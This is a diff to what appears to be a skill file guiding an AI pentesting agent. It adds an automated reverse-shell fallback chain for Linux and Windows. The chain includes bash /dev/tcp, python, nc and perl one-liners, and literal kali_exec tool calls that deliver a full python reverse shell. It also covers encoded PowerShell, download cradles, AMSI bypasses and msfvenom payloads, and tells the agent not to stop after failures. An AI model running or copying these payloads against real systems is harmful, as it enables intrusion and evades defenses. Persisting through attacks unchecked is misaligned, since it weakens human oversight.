@@ -271,12 +271,61 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
 ### When invoked standalone
 
 1. Call `log_note` — record target OS, available access, injection point
-2. Determine target OS and available interpreters
-3. Select appropriate payload from the reference above
-4. Set up listener in Kali container
-5. Deliver payload via the injection/execution vector
-6. Verify callback
+2. **Probe available interpreters** on the target (if you have command execution):
+   ```
+   which bash python3 python perl ruby nc ncat socat lua node php 2>/dev/null
+   ```
+3. Set up listener in Kali container (keep it running for the full fallback chain)
+4. Select the first payload from the fallback chain below and deliver it
+5. **If no callback within 10 seconds** — try the next payload in the chain
+6. Repeat until a shell connects or all payloads are exhausted
 7. Stabilize the shell
+
+### Fallback Chain — Linux
+
+If a payload fails (no callback), try the next one automatically. **Do NOT stop after one failure.**
+
+| Priority | Payload | Why it might fail |
+|----------|---------|-------------------|
+| 1 | `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` | `/dev/tcp` not compiled in (Debian/Ubuntu default) |
+| 2 | `python3 -c 'import socket,os,pty;...'` | python3 not installed |
+| 3 | `python -c 'import socket,os,pty;...'` | python2 only on older systems |
+| 4 | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc LHOST LPORT >/tmp/f` | nc not installed |
+| 5 | `perl -e 'use Socket;...'` | perl not installed |
+| 6 | `php -r '$sock=fsockopen("LHOST",LPORT);...'` | php not installed |
+| 7 | `ruby -rsocket -e '...'` | ruby not installed |
+| 8 | `lua -e "require('socket');..."` | lua not installed |
+| 9 | `openssl s_client -quiet -connect LHOST:LPORT` (with mkfifo) | openssl not installed |
+| 10 | `sh -i >& /dev/udp/LHOST/LPORT 0>&1` (UDP) | UDP listener needed |
+| 11 | msfvenom ELF binary (wget + chmod + execute) | wget/curl needed for download |
+
+**How to implement the fallback:**
+```
+# Set up ONE listener (keep it running)
+kali_exec("ncat -lvnp 4444 > /tmp/shell-output.txt 2>&1 &")
+
+# Try bash first
+kali_exec("python3 /tmp/exploit.py TARGET 'bash -i >& /dev/tcp/LHOST/4444 0>&1'")
+kali_exec("sleep 5 && cat /tmp/shell-output.txt | head -5")  # check for callback
+
+# No callback? Try python
+kali_exec("python3 /tmp/exploit.py TARGET 'python3 -c \"import socket,os,pty;s=socket.socket();s.connect((\\\"LHOST\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/bash\\\")\"'")
+kali_exec("sleep 5 && cat /tmp/shell-output.txt | head -5")  # check again
+
+# Continue down the chain...
+```
+
+Call `log_note` after each attempt recording which payload was tried and the result.
+
+### Fallback Chain — Windows
+
+| Priority | Payload | Why it might fail |
+|----------|---------|-------------------|
+| 1 | PowerShell reverse shell | Execution policy, AppLocker, AMSI |
+| 2 | PowerShell base64 encoded (`-enc`) | Bypasses basic string detection |
+| 3 | PowerShell download cradle (`IEX(...)`) | Network restrictions |
+| 4 | msfvenom EXE (certutil download) | AV detection |
+| 5 | msfvenom PS1 (AMSI bypass + exec) | Stricter AV/EDR |
 
 ### When chained from another skill
 
@@ -285,7 +334,7 @@ The calling skill provides:
 - How command execution works (SQLi OS shell, RCE exploit, file upload, etc.)
 - Target OS (Linux/Windows)
 
-Generate the right payload and listener, then return control to the calling skill.
+Set up the listener, run the fallback chain until a shell connects, then return control to the calling skill.
 
 ---
 
